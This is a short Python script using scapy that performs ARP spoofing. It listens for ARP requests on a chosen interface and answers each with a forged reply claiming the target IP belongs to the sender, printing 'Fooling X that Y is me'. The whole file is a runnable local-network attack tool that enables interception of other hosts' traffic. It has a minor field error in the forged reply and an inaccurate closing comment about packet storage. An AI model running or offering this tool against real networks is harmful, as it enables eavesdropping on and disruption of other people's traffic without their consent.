#! /usr/bin/python3

import sys
import time
from scapy.layers.l2 import ARP, Ether
from scapy.all import sendp, sniff

def arpPoisonCallback(packet):
    #Got ARP request?
    if packet[ARP].op==1:
        answer = Ether(dst=packet[ARP].hwsrc)/ARP()
        answer[ARP].op = "is-at"
        answer[ARP].hwdst = packet[ARP].hwsrc
        answer[ARP].psrc = packet[ARP].pdst
        answer[ARP].pdst = packet[ARP].pdst

        print("Fooling {0} that {1} is me".format(packet[ARP].psrc, packet[ARP].pdst))

        sendp(answer, iface=sys.argv[1])


if len(sys.argv) < 2:
    print(sys.argv[0] + ": <iface>")
    sys.exit(1)

sniff(prn=arpPoisonCallback, filter="arp", iface=sys.argv[1], store=0)

#store = 0 --> packet will only be saved in memory but nt on the HDD


